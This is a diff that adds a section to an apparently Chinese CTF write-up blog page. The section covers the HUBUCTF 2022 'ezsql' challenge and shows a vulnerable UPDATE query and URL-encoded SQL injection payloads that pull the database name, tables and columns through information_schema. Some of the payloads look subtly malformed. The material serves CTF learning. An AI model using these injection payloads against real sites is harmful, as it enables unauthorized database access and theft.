@@ -576,6 +576,20 @@ print(finall)
 </code></pre>
 <p><img src="https://i0.hdslb.com/bfs/article/bb2310e924d13567478a5abdf7566fff290349942.png" alt=""></p>
 <p>再在在线网站运行就行，版本要求<code>PHP 7.1.0+</code></p>
+<h1 id="HUBUCTF-2022-新生赛-ezsql"><a href="#HUBUCTF-2022-新生赛-ezsql" class="headerlink" title="[HUBUCTF 2022 新生赛]ezsql"></a>[HUBUCTF 2022 新生赛]ezsql</h1><p>考察update注入,首先可以注册一个账号，进入改资料的界面，抓包可以发现这里是进行了一个update操作<img src="https://i0.hdslb.com/bfs/article/3f99aa812cff56be341dd95ca1ff4a3e290349942.png" alt=""></p>
+<p>可以猜测到后台是用的update,其次可以扫描目录<br><img src="https://i0.hdslb.com/bfs/article/0e3b99f7b8c18adc371ac7a8c42c78f3290349942.png" alt=""><br>可以发现源码泄露</p>
+<p>注入语句</p>
+<pre><code class="lang-sql">update users set age=$_POST[age],nickname=&#39;$_POST[nickname]&#39;,description=&#39;$_POST[description]&#39; where id=$_SESSION[id];
+</code></pre>
+<p>注入database</p>
+<pre><code>
+nickname=%27+or+%3D1%3D11#&amp;age=111,description=(select+database())#&amp;description=(select+group_concat(password)users)%23&amp;token=6344aa21324c599047073b593793ee61
+</code></pre><p>database会在description显示</p>
+<p>tables</p>
+<pre><code>nickname=%27+or+%3D1%3D11#&amp;age=111,description=(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())#&amp;description=(select+group_concat(password)users)%23&amp;token=6344aa21324c599047073b593793ee61
+</code></pre><p>columns</p>
+<pre><code> nickname=%27+or+%3D1%3D11#&amp;age=111,description=(select+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name=0x7573657273)#&amp;description=(select+group_concat(password)users)%23&amp;token=6344aa21324c599047073b593793ee61
+</code></pre><p> <code>users</code>要改成十六进制的<code>0x7573657273</code></p>
 
         </div>
         <!-- .entry-content -->
